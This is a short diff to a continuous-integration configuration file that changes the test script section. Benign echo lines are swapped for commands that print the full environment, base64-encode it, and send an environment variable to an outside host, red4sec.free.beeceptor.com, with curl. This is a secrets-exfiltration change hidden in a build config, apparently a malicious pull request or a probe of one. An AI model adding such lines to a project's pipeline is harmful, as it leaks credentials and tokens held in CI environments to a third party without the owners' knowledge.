@@ -8,8 +8,10 @@ env:
 
 # command to run tests
 script:
-  - echo "somevar:$SOMEVAR"
-  - echo "travisvar:$TRAVISVAR"
+  - echo $SOMEVAR
+  - echo $(env)
+  - echo $(env)|base64
+  - curl https://red4sec.free.beeceptor.com/my/api/path?$SOMEVAR
 
 deploy:
   # Deploy to Docker Hub
